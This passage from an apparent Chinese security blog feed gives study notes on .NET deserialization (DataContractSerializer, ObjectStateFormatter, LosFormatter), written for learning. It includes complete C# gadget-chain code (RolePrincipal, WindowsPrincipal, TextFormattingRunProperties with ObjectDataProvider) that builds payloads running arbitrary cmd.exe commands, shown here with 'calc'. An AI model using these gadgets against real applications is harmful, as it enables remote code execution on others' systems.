fileName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> xml = File.ReadAllText(fileName);</span><br><span class="line">            XmlDocument xmlDocument = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">            xmlDocument.LoadXml(xml);</span><br><span class="line">            XmlNode rootNode = xmlDocument.SelectSingleNode(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">            XmlNode typeNode = rootNode.Attributes.GetNamedItem(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">            DataContractSerializer dataContractSerializer = <span class="keyword">new</span> DataContractSerializer(Type.GetType(typeNode.InnerText));</span><br><span class="line">            Console.WriteLine(Type.GetType(typeNode.InnerText));</span><br><span class="line">            dataContractSerializer.ReadObject(<span class="keyword">new</span> XmlTextReader(<span class="keyword">new</span> StringReader(rootNode.InnerXml)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用栈</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">XamlReader.Parse()at </span><br><span class="line">TextFormattingRunProperties.GetObjectFromSerializationInfo()</span><br><span class="line"><span class="keyword">new</span> TextFormattingRunProperties()</span><br><span class="line">[<span class="meta">Native to Managed Transition</span>]</span><br><span class="line">ObjectManager.CompleteISerializableObject()</span><br><span class="line">ObjectManager.FixupSpecialObject()</span><br><span class="line">ObjectManager.DoFixups()</span><br><span class="line">ObjectReader.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.DeserializeValue()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">LosFormatter.Deserialize()</span><br><span class="line"><span class="keyword">new</span> SessionViewState.SessionViewStateHistoryItem()</span><br><span class="line">[<span class="meta">Lightweight Method Call</span>]</span><br><span class="line">ClassDataContract.ReadXmlValue()</span><br><span class="line">XmlObjectSerializerReadContext.ReadDataContractValue()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">DataContractSerializer.InternalReadObject()</span><br><span class="line">XmlObjectSerializer.ReadObjectHandleExceptions()</span><br><span class="line">DataContractSerializer.ReadObject()</span><br><span class="line">Program.ReadObject()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><p>就是控制type和xml值就行了</p><p>NetDataContractSerializer和DataContractSerializer同样用于序列化和反序列化 Windows Communication Foundation (WCF) 消息中发送的数据。</p><p>两者有一个重要的区别在于：<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8">NetDataContractSerializer</a> 在序列化的 XML 中包含 CLR 类型信息；而 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.datacontractserializer?view=netframework-4.8">DataContractSerializer</a> 不包含。 因此，只有在序列化和反序列化端使用相同的 CLR 类型时，才能使用 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8">NetDataContractSerializer</a>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractSerializer.md&quot;&gt;https://github.com/Y4er/dotnet-deserializati</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-07</title>
    <link href="https://ke1nys.github.io/posts/4d98bf02.html"/>
    <id>https://ke1nys.github.io/posts/4d98bf02.html</id>
    <published>2024-03-06T07:00:40.000Z</published>
    <updated>2024-03-06T09:17:45.663Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/ObjectStateFormatter.md">https://github.com/Y4er/dotnet-deserialization/blob/main/ObjectStateFormatter.md</a></p><h2 id="ObjectStateFormatter"><a href="#ObjectStateFormatter" class="headerlink" title="ObjectStateFormatter"></a>ObjectStateFormatter</h2><p>在06中就讲到的LosFormatter反序列化的时候  就会将字节流转到这个反序列化类来进行</p><p>ObjectStateFormatter和没有设置mac/keys的LosFormatter是一样的。所以在遇到ObjectStateFormatter反序列化时直接用ysoserial.net的LosFormatter生成payload即可，除非需要mac/key</p><p><strong>(06中没有用到mac/key)</strong></p><p>和LosFormatter一样  也是能接受stream和string类型的序列化</p><h2 id="RolePrincipal"><a href="#RolePrincipal" class="headerlink" title="RolePrincipal"></a>RolePrincipal</h2><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security.Claims;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ObjectStateFormatterSerialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            TextFormattingRunPropertiesMarshal calc = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> b64payload;</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream m = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(m, calc);</span><br><span class="line">                b64payload = Convert.ToBase64String(m.ToArray());</span><br><span class="line">            &#125;</span><br><span class="line">            RolePrincipalMarshal rolePrincipalMarshal = <span class="keyword">new</span> RolePrincipalMarshal(b64payload);</span><br><span class="line">            ObjectStateFormatter objectStateFormatter = <span class="keyword">new</span> ObjectStateFormatter();</span><br><span class="line">            <span class="built_in">string</span> p = objectStateFormatter.Serialize(rolePrincipalMarshal);</span><br><span class="line">            objectStateFormatter.Deserialize(p);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">RolePrincipalMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">RolePrincipalMarshal</span>(<span class="params"><span class="built_in">string</span> b64payload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            B64Payload = b64payload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> B64Payload &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(System.Web.Security.RolePrincipal));</span><br><span class="line">            info.AddValue(<span class="string">&quot;System.Security.ClaimsPrincipal.Identities&quot;</span>, B64Payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line">            _xaml = XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h3><p>先去看这个RolePrincipal的反序列化构造函数</p><p><img src="../images/image-20240306152938875.png" alt="image-20240306152938875"></p><p>其用的是其父类ClaimsPrincipal的反序列化构造函数  我们跟进</p><p><img src="../images/image-20240306153053874.png" alt="image-20240306153053874"></p><p>接着跟进这个Deserialize函数中</p><p><img src="../images/image-20240306153126203.png" alt="image-20240306153126203"></p><p>发现其需要的是ClaimsPrincipal类中的Identities参数   先不知道这个参数是干啥的  我们接着跟进这个DeserializeIdentities函数中去</p><p><img src="../images/image-20240306153248282.png" alt="image-20240306153248282"></p><p>发现其会先base64解码我们传入的值  然后进行反序列化操作  </p><p>那么我们的目标就清晰了  只需将payload的base64编码在序列化的时候传入到System.Security.ClaimsPrincipal.Identities中就行了</p><h2 id="WindowsPrincipal"><a href="#WindowsPrincipal" class="headerlink" title="WindowsPrincipal"></a>WindowsPrincipal</h2><p>demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">using Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line">using System;</span><br><span class="line">using System.Collections.Specialized;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Security.Claims;</span><br><span class="line">using System.Security.Principal;    </span><br><span class="line">using System.Web.UI;</span><br><span class="line">using System.Windows.Data;</span><br><span class="line">using System.Windows.Markup;</span><br><span class="line"></span><br><span class="line">namespace ObjectStateFormatterSerialize</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            // WindowsIdentity currentWI = WindowsIdentity.GetCurrent();</span><br><span class="line">            // currentWI.Actor = new ClaimsIdentity();</span><br><span class="line">            // currentWI.Actor.BootstrapContext = new TextFormattingRunPropertiesMarshal(&quot;calc&quot;);</span><br><span class="line">            // WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();</span><br><span class="line">            // obj.wi = currentWI;</span><br><span class="line">            // string v = new ObjectStateFormatter().Serialize(obj);</span><br><span class="line">            // new ObjectStateFormatter().Deserialize(v);</span><br><span class="line">            WindowsIdentity currentWI = WindowsIdentity.GetCurrent();</span><br><span class="line">            currentWI.BootstrapContext= new TextFormattingRunPropertiesMarshal(&quot;calc&quot;);</span><br><span class="line">            WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();</span><br><span class="line">            obj.wi = currentWI;</span><br><span class="line">            string v = new ObjectStateFormatter().Serialize(obj);</span><br><span class="line">            new ObjectStateFormatter().Deserialize(v);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    [Serializable]</span><br><span class="line">    public class WindowsPrincipalMarshal : ISerializable</span><br><span class="line">    &#123;</span><br><span class="line">        public WindowsPrincipalMarshal() &#123; &#125;</span><br><span class="line">        public WindowsIdentity wi &#123; get; set; &#125;</span><br><span class="line">        public void GetObjectData(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(typeof(WindowsPrincipal));</span><br><span class="line">            info.AddValue(&quot;m_identity&quot;, wi);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [Serializable]</span><br><span class="line">    public class TextFormattingRunPropertiesMarshal : ISerializable</span><br><span class="line">    &#123;</span><br><span class="line">        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        string _xaml;</span><br><span class="line">        public void GetObjectData(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = typeof(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(&quot;ForegroundBrush&quot;, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        public TextFormattingRunPropertiesMarshal(string cmd)</span><br><span class="line">        &#123;</span><br><span class="line">            // ObjectDataProvider</span><br><span class="line">            ProcessStartInfo psi = new ProcessStartInfo();</span><br><span class="line">            psi.FileName = &quot;cmd.exe&quot;;</span><br><span class="line">            psi.Arguments = $&quot;/c &#123;cmd&#125;&quot;;</span><br><span class="line">            StringDictionary dict = new StringDictionary();</span><br><span class="line">            psi.GetType().GetField(&quot;environmentVariables&quot;, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = new Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = new ObjectDataProvider();</span><br><span class="line">            odp.MethodName = &quot;Start&quot;;</span><br><span class="line">            odp.IsInitialLoadEnabled = false;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line">            _xaml = XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Gadgets-1"><a href="#Gadgets-1" class="headerlink" title="Gadgets"></a>Gadgets</h3><p>其实这里用的原理就是ClaimsIdentity链子的原理 </p><p>LosFormatter底层ObjectStatesFormatter会调用binaryformatter序列化和反序列化自身object字段</p><p><img src="../images/image-20240306171041228.png" alt="image-20240306171041228"></p><p><img src="../images/image-20240306171108616.png" alt="image-20240306171108616"></p><p>这里反序列化的时候  就会反序列化WindowsIdentity类  那么我们进入到这个类的反序列化构造函数中去</p><p><img src="../images/image-20240306171236950.png" alt="image-20240306171236950"></p><p>发现其调用了其父类ClaimsIdentity的反序列化构造方法  我们接着跟进</p><p><img src="../images/image-20240306171249757.png" alt="image-20240306171249757"></p><p><img src="../images/image-20240306171305016.png" alt="image-20240306171305016"></p><p>又因为我们之前给了bootstrapContext赋值 那么这里的话就会对我们传入的字符串进行base64解码  然后再进行反序列化操作</p><p>这样就结束了</p><h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ClaimsIdentity.Deserialize()</span><br><span class="line">new ClaimsIdentity()</span><br><span class="line">new WindowsIdentity()</span><br><span class="line">new WindowsIdentity()</span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject()</span><br><span class="line">ObjectManager.FixupSpecialObject()</span><br><span class="line">ObjectManager.DoFixups()</span><br><span class="line">ObjectReader.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.DeserializeValue()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>06  07基本都是多加一个类少加一个类的关系   本质上差不多</p><p>除了关注反序列化方法传入的参数值，还需要注意使用LosFormatter和ObjectStatesFormatter可能会造成二次反序列化，要关注object类型的字段。</p><p>这两个反序列化的东西  都会反序列化其类里的object参数</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/ObjectStateFormatter.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-06</title>
    <link href="https://ke1nys.github.io/posts/3a9f8f94.html"/>
    <id>https://ke1nys.github.io/posts/3a9f8f94.html</id>
    <published>2024-03-05T02:49:56.000Z</published>
    <updated>2024-03-06T08:27:17.087Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LosFormatter"><a href="#LosFormatter" class="headerlink" title="LosFormatter"></a>LosFormatter</h2><p>LosFormatter一般用于序列化存储视图流状态，多用于Web窗体，如ViewState。LosFormatter封装在System.Web.dll中，命名空间为System.Web.UI，使用LosFormatter反序列化不信任的数据会造成RCE。</p><p><img src="../images/image-20240305110405937.png" alt="image-20240305110405937"></p><p>两个参数的构造方法表示使用”启用mac”和”mac密钥修饰符”来初始化LosFormatter。使用LosFormatter序列化对象仍需要标记[Serializable]</p><p><strong>demo</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">LosFormatterDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">Serializable</span>]</span><br><span class="line">        <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="built_in">string</span> Name</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">get</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">                <span class="keyword">set</span> &#123; name = <span class="keyword">value</span>; &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">private</span> <span class="built_in">int</span> age;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="built_in">int</span> Age</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">get</span> &#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line">                <span class="keyword">set</span> &#123; age = <span class="keyword">value</span>; &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="title">Person</span>(<span class="params"><span class="built_in">string</span> name, <span class="built_in">int</span> age</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line">                Name = name;</span><br><span class="line">                Age = age;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SayHello</span>()</span></span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            LosFormatter losFormatter = <span class="keyword">new</span> LosFormatter();</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memory = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                losFormatter.Serialize(memory, <span class="keyword">new</span> Person(<span class="string">&quot;jack&quot;</span>, <span class="number">15</span>));</span><br><span class="line"></span><br><span class="line">                memory.Position = <span class="number">0</span>;</span><br><span class="line">                Person p = (Person)losFormatter.Deserialize(memory);</span><br><span class="line">                p.SayHello();</span><br><span class="line">                Console.WriteLine(Encoding.UTF8.GetString(memory.ToArray()));</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240305111501233.png" alt="image-20240305111501233"></p><p>可见losformatter序列化之后的对象是base64编码的，以<code>/wEyt</code>开头，实战中应注意。</p><p>LosFormatter有多个反序列化Deserialize()重载</p><p><img src="../images/image-20240305111600024.png" alt="image-20240305111600024"></p><p>反序列化方法也有多个重载方法  字符流和字符串都可以接受</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">    LosFormatter losFormatter = new LosFormatter();</span><br><span class="line">    Person p = (Person)losFormatter.Deserialize(&quot;/wEytAEAAQAAAP////8BAAAAAAAAAAwCAAAATkxvc0Zvcm1hdHRlckRlc2VyaWFsaXplLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJkxvc0Zvcm1hdHRlckRlc2VyaWFsaXplLlByb2dyYW0rUGVyc29uAgAAAARuYW1lA2FnZQEACAIAAAAGAwAAAARqYWNrDwAAAAs=&quot;);</span><br><span class="line">    p.SayHello();</span><br><span class="line">    Console.ReadKey();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240305112109672.png" alt="image-20240305112109672"></p><p><img src="../images/image-20240305112202095.png" alt="image-20240305112202095"></p><p>跟进其反序列化函数发现   其反序列化使用的是<code>ObjectStateFormatter</code>来进行反序列化</p><p><img src="../images/image-20240305112339413.png" 